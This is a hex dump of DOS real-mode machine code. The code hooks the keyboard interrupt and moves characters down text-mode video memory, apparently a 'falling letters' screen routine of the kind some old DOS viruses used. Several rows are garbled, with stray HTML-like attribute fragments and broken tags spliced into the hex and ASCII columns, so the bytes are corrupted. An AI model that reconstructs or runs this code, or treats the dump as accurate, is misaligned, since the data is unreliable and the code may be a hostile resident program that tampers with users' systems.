08E0:   00000000 00000000  00000000 00000000   00000000 00000000  00000000 00000000   "................................"
0900:   00000000 00000000  00000000 00000000   00000000 00000000  00000000 00000000   "................................"
0920:   00000000 00000000  00000051 1E065657   0E07FCA8 207456A8  02756333 C08ED8A0   "...........Q..VW.... tV..uc3...."
0940:   4904B900 B83C0775  05B900B0 EB083C02   74043C03 75482E89  0E7C092E 800E7209   "I....<><><.uh...|....r." 0960:="" 022ec706="" 7e090000="" 8ed9b9d0="" 0733f6bf="" f50cf3a5="" 33c08ed8="" b8920b87="" 0624002e="" "....~........3......3........$.."="" 0980:="" a373098c="" c8870626="" 002ea375="" 09b95000="" b8000fbf="" 0501f3ab="" 2e802672="" 09075f5e="" ".s.....&...u..p...........&r.._^"="" 09a0:="" 071f59e9="" e000eb83="" 502ec606="" 7909002e="" a07209a8="" 6075efa8="" 8074402e="" 833e7e09="" "..y.....p...y....r..`u...t@..="">~."
09C0:   0074142E FF067E09  2E813E7E 0944047C   06E80801 E9AF00A8  18741D2E FF0E7709   ".t....~...>~.D.|.........t....w."
09E0:   75162E80 267209E7  2E800E72 0940A808   74062E80 0E720920  E98B002E 80367209   "u...&r.....r.@..t....r. .....6r."
0A00:   01A80174 F353561E  2E8E1E7C 0933F62E   C6066E09 002E8B9C  05010BDB 74198038   "...t.SV....|.3....n.........t..8"
0A20:   20751480 B860FF20  740DB820 07878060   FF890081 C3A00081  FBA00F74 07803820   " u...`. t.. ...`...........t..8 "
0A40:   75027517 BB000F80  38207507 80B860FF   20750881 EBA0000B  DB75EC2E 899C0501   "u.u.....8 u...`. u.......u......"
0A60:   2E091E6E 0983C602  81FEA000 75A72E80   3E6E0900 750D2E80  0E720980 2EC7067E   "...n........u...>n..u....r.....~"
0A80:   0901001F 5E5B58EA  53FF00F0 B020E620   58CF50E4 602EA27A  09E4618A E00C80E6   "....^[X.S.... . X.P.`..z..a....."
0AA0:   618AC4E6 612E803E  7909002E C6067909   0175D92E A07A093C  F074D124 7F2E3A06   "a...a..>y.....y..u...z.<.t.$..:." 0ac0:="" 7b092ea2="" 7b0974c4="" 2e833e7e="" 09007407="" 2ec7067e="" 090100e8="" 0200ebb0="" 2ec70677="" "{...{.t...="">~..t....~...........w"
0AE0:   0928002E F6067209  8074A12E C6067009   0153561E 2E8E1E7C  092EF606 72091075   ".(....r..t....p..SV....|....r..u"
0B00:   2F2E800E 72091033  F6BB000F 80382074   0981EBA0 0073F5BB  000F81C3 A0002E89   "/...r..3.....8 t.....s.........."
0B20:   9C05012E 899C8009  464681FE A00075D9   33F62E81 BC0501A0  0F745A2E 8B9C8009   "........FF....u.3........tZ....."
0B40:   8B002E3B 80F50C75  15530BDB 743381EB   A0002E3B 80F50C75  F13B0074 ED5B0BDB   "...;...u.S..t3.....;...u.;.t.[.."
0B60:   7506C704 2007EB1A  8B008980 60FFC700   20072E81 AC8009A0  002EC606 700900EB   "u... .......`... ...........p..."
0B80:   145B2E8B 9C050181  C3A0002E 899C0501   2E899C80 09464681  FEA00075 952E803E   ".[...................FF....u...>"
0BA0:   70090074 40065751  1E070E1F BEF50C33   FFB9D007 F3A52EC7  067709DC FF2E8026   "p..t@.WQ.......3.........w.....&"
0BC0:   7209042E 800E7209  882EC706 7E090000   33C08ED8 2EA17309  A324002E A17509A3   "r.....r.....~...3.....s..$...u.."
0BE0:   2600595F 071F5E5B  C3FC582B C603C706   50F3A4CB 9050E8E2  038B                "&.Y_..^[..X+....P....P...."



</.t.$..:."></.uh...|....r."></.r4..=.!r-......">